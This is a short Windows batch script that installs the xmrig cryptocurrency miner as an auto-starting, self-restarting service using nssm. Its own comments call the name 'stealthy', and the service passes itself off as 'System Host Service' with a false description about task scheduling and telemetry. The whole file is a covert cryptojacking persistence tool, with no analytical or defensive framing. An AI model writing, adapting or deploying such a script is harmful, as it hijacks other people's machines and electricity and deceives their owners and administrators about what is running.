@echo off
cd /d "%~dp0"

rem === Install the miner service with a stealthy name ===
nssm install SystemHostService "%cd%\xmrig.exe"
nssm set SystemHostService AppDirectory "%cd%"
nssm set SystemHostService Start SERVICE_AUTO_START
nssm set SystemHostService AppParameters ""
nssm set SystemHostService DisplayName "System Host Service"
nssm set SystemHostService Description "Handles background task scheduling and system telemetry."
nssm set SystemHostService AppExit Default Restart

rem === Start the service ===
nssm start SystemHostService

echo Miner service 'SystemHostService' installed and started successfully.
pause
